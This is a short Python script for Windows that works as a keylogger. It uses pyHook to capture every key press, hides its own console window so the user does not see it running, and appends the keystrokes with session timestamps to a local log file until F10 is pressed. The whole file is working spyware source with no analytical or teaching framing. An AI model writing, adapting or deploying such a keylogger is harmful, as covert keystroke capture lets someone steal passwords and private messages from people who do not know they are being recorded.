import pythoncom, pyHook, win32gui, win32console, os
from time import strftime

window = win32console.GetConsoleWindow()  #go to script window
win32gui.ShowWindow(window,0)


def OnKeyboardEvent(event):

    print('MessageName:',event.MessageName)
    print('Message:',event.Message)
    print('Time:',event.Time)
    print('Window:',event.Window)
    print('WindowName:',event.WindowName)
    print('Ascii:', event.Ascii, chr(event.Ascii))
    print('Key:', event.Key)
    print('KeyID:', event.KeyID)
    print('ScanCode:', event.ScanCode)
    print('Extended:', event.Extended)
    print('Injected:', event.Injected)
    print('Alt', event.Alt)
    print('Transition', event.Transition)
    print('---')

    # TODO handle output
    # TODO check for when WindowName has changed.
    f = open('log_file.txt', 'a')
    # if lastWindow != event.WindowName:
    #     f.write('\n' + event.WindowName + '\n')
    #     lastWindow = event.WindowName
    if event.Key == 'Space':
        f.write(' ')
    elif event.Key == 'Return':
        f.write('\n')
    elif event.Key == 'Oem_Period':
        f.write('.')
    elif event.Key == 'Back':
        f.seek(-1, os.SEEK_END)
        f.truncate()
    elif event.Key == 'F10':
        f.write('\nNew Keylogging session ended at ' + strftime("%a, %d %b %Y %X") + '\n')
        exit(0)
    else:
        f.write(event.Key)
    # return True to pass the event to other handlers
    return True

f = open('log_file.txt', 'a')
f.write('\nNew Keylogging session started at ' + strftime("%a, %d %b %Y %X") + '\n')
f.close()
# create a hook manager
hm = pyHook.HookManager()
# watch for all mouse events
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
